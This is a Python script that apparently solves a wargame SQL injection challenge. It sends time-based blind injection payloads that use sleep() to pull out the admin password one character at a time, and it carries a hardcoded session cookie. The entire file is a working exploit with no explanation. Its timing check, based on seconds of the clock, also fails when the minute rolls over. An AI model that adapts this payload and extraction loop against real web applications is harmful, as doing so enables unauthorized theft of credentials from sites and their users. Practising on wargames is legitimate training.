import requests
import time

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookie = {'PHPSESSID': 'jett8kmnsi97cl8bu5naomvbdm'}

def pw_find():
    length = 8
    password = ""
    for i in range(length):
        for value in range(127):
            start_time = int(time.strftime('%S', time.localtime(time.time())))
            end_time = start_time+2
            param = {"pw":"' or id='admin' and if(ascii(substring(pw, {}, 1))={},sleep(5),-1) #".format(i+1, value)}
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            now = int(time.strftime('%S', time.localtime(time.time())))
            if end_time < now:
                password += chr(value)
                print(password)
                break
                
    print("Password:", password)

pw_find()